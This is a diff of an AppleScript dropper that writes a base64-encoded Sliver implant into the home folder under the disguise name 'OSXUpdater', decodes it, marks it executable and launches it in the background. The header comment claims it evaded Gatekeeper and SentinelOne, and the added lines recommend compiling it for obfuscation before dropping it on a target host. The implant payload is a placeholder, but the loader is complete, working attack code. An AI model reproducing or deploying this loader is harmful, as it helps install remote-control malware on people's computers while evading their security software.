@@ -3,17 +3,23 @@ It takes a base64 encoded Sliver payload (compiled for Mac of course), writes it
 performs chmod +x on the resulting file, then executes the sliver. Tested on Mac OSX Catalina with Gatekeeper and SentinelOne active.
 The sliver was not detected or blocked.
 
+This can be run raw as is or for additional obfuscation, you can paste into MacOS Script Editor and saveit as a compiled script object before dropping on the target host. In either case, the command line to run it is:
+
+osascript <filename>
+
 Modify filenames and such to match your purpose/pretext. *)
 
-set encodedUpdater to "<Base64 encoded Sliver goes here>"
+set encodedUpdater to "<Paste Base64 encoded sliver here>"
 tell application "Finder"
-	set currentPath to container of (get path to home folder) as string
+	set currentPath to home as string
 end tell
+set runPath to POSIX path of currentPath as string
+display notification runPath
 set newPath to currentPath & "OSXUpdater_b64"
 set writePath to open for access file newPath with write permission
 set eof of the writePath to 0
 write encodedUpdater to the writePath starting at eof
 close access the writePath
-do shell script "base64 --decode -i OSXUpdater_b64 -o OSXUpdater"
-do shell script "chmod +x OSXUpdater"
-do shell script "./OSXUpdater &"
+do shell script "base64 --decode -i " & runPath & "/OSXUpdater_b64 -o " & runPath & "/OSXUpdater"
+do shell script "chmod +x " & runPath & "/OSXUpdater"
+do shell script runPath & "/OSXUpdater &"
